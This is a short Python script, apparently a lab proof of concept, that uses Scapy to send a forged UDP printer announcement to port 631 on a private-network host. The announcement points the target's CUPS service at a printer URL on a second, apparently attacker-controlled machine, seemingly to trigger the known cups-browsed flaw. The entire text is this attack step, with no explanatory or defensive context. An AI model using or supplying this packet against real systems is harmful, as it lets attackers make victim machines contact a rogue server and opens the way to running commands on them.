rom scapy.all import *

packet = IP(dst="192.168.37.130") / UDP(dport=631) / Raw(load="0 3 http://192.168.37.131:1234/printers/whatever")

send(packet)

print("Packet sent over to 192.168.37.130")